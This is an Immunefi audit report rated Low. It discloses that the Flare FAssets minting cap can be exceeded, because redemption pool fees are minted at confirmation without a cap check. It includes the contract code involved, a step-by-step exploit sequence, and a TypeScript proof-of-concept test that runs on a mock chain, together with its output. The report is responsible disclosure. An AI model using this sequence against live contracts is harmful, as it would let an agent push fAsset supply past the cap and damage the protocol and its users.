# #54916 \[SC-Low] minting cap can be surpassed via redemption fee

**Submitted on Sep 18th 2025 at 18:17:57 UTC by @holydevoti0n for** [**Mitigation Audit | Flare | FAssets**](https://immunefi.com/audit-competition/flare-fassets--mitigation-audit)

* **Report ID:** #54916
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/commit/2abc918d3dec2ea6c4f34ca972a6eeb89b4ecafc>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

The recent fix correctly adds cap checks (including pool fee) for `selfMint` and `mintFromFreeUnderlying`, but this does not prevent the minting cap from being surpassed due to the protocol not accounting for the fees that are minted as fAssets when confirming redemption.

### Vulnerability Details

Problem is: redemptions burn first (freeing capacity) and fee mint happens later, an agent/user can refill the freed capacity via `selfMint` and then push total supply above the cap when the redemption fee is minted.

fAssets minted for the pool when confirming redemption:

<https://github.com/flare-foundation/fassets/blob/d274320418134194cf74f69f95326ca40e2c1fed/contracts/assetManager/facets/RedemptionConfirmationsFacet.sol#L114>

```solidity
    function confirmRedemptionPayment(
        IPayment.Proof calldata _payment,
        uint256 _redemptionRequestId
    )
        external
        nonReentrant
    {
     ...
            // charge the redemption pool fee share by re-minting some fassets
@>            _mintPoolFee(agent, request, _redemptionRequestId);
```

The `mintingCap` fails to account for those fees: <https://github.com/flare-foundation/fassets/blob/d274320418134194cf74f69f95326ca40e2c1fed/contracts/assetManager/library/Minting.sol#L82-L94>

```solidity
    function checkMintingCap(
        uint64 _increaseAMG
    )
        internal view
    {
        AssetManagerState.State storage state = AssetManagerState.get();
        AssetManagerSettings.Data storage settings = Globals.getSettings();
        uint256 mintingCapAMG = settings.mintingCapAMG;
        if (mintingCapAMG == 0) return;     // minting cap disabled
@>        uint256 totalMintedUBA = IERC20(settings.fAsset).totalSupply();
@>        uint256 totalAMG = state.totalReservedCollateralAMG + Conversion.convertUBAToAmg(totalMintedUBA);
@>        require(totalAMG + _increaseAMG <= mintingCapAMG, MintingCapExceeded());
    }
```

Example of how minting cap could be surpassed:

{% stepper %}
{% step %}

### Step

Set cap to C; agent selfMints to reach C.
{% endstep %}

{% step %}

### Step

Redeem r lots (burn r → frees r capacity under the cap).
{% endstep %}

{% step %}

### Step

Immediately selfMint r again (cap check passes; total supply back to C).
{% endstep %}

{% step %}

### Step

Later confirm the redemption: the pool-fee F for that redemption is minted without a cap check → total supply becomes C + F.

Repeat across many pending redemptions to accumulate overshoot ΣF.
{% endstep %}
{% endstepper %}

## Impact Details

* Total supply exceeds the configured minting cap by Σ(fees) minted on confirmations.
* Bypass of critical system constraint (minting cap)

## Proof of Concept

Add the following test on `02-MintAndRedeem.ts`:

```typescript
 it.only("minting cap can be surpassed via redemption fee after selfMint", async () => {
            const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
            const redeemer = await Redeemer.create(context, redeemerAddress1, underlyingRedeemer1);
            // make agent available
            const fullAgentCollateral = toWei(3e8);
            await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
            // mine some blocks to skip the agent creation time and update block
            mockChain.mine(5);
            await context.updateUnderlyingBlock();

            // Set minting cap to 10 lots
            const capLots = 10;
            await context.assetManagerController.setMintingCapAmg([context.assetManager.address], context.convertLotsToAMG(capLots), { from: governance });

            // Configure agent so selfMint pool fee is 0, but redemption pool fee is 100%
            await agent.changeSettings({ feeBIPS: 0, redemptionPoolFeeShareBIPS: MAX_BIPS });

            // 1) Agent fills the cap with selfMint (fee = 0 => cap counted exactly by lots)
            const minted1 = await agent.selfMint(context.convertLotsToUBA(capLots), capLots);
            assertWeb3Equal(minted1.poolFeeUBA, 0);

            // 2) Move a portion to the redeemer and request redemption (burns immediately)
            const redeemLots = 2;
            await context.fAsset.transfer(redeemer.address, context.convertLotsToUBA(redeemLots), { from: agent.ownerWorkAddress });
            const [requests] = await redeemer.requestRedemption(redeemLots);
            assert.equal(requests.length, 1);
            const request = requests[0];
            assert.equal(request.agentVault, agent.vaultAddress);

            // 3) Agent performs the payment on underlying, but does NOT confirm yet (fee mint happens on confirm)
            const rdTxHash = await agent.performRedemptionPayment(request);

            // 4) Agent selfMints again to consume the freed capacity (equal to redeemed lots)
            const minted2 = await agent.selfMint(context.convertLotsToUBA(redeemLots), redeemLots);
            assertWeb3Equal(minted2.poolFeeUBA, 0);

            // Sanity: at this point total supply (in AMG) should be equal to cap
            const settingsBefore = await context.assetManager.getSettings();
            const capAmg = settingsBefore.mintingCapAMG;
            const supplyBeforeUBA = await context.fAsset.totalSupply();
            const supplyBeforeAMG = context.convertUBAToAmg(supplyBeforeUBA);
            assertWeb3Equal(supplyBeforeAMG, capAmg);

            // 5) Now confirm redemption payment – this mints the redemption pool fee to the pool (no cap check)
            await agent.confirmActiveRedemptionPayment(request, rdTxHash);

            // Observe cap overshoot: total supply (AMG) > minting cap
            const settingsAfter = await context.assetManager.getSettings();
            const supplyAfterUBA = await context.fAsset.totalSupply();
            const supplyAfterAMG = context.convertUBAToAmg(supplyAfterUBA);

            // Print values for judge visibility
            // eslint-disable-next-line no-console
            console.log("Minting cap AMG:", settingsAfter.mintingCapAMG.toString());
            // eslint-disable-next-line no-console
            console.log("Total supply AMG after confirm (should exceed cap):", supplyAfterAMG.toString());

            // Assert overshoot
            assert.isTrue(supplyAfterAMG.gt(settingsAfter.mintingCapAMG), "total supply should exceed minting cap after fee mint");
        });
```

run: `yarn test`

output:

```solidity
  Contract: AssetManager.sol; test/integration/assetManager/02-MintAndRedeem.ts; Asset manager integration tests
    simple scenarios - successful minting and redeeming
Minting cap AMG: 2000000000
Total supply AMG after confirm (should exceed cap): 2008000000
      ✔ cap overshoot via redemption fee after selfMint (88ms)
```
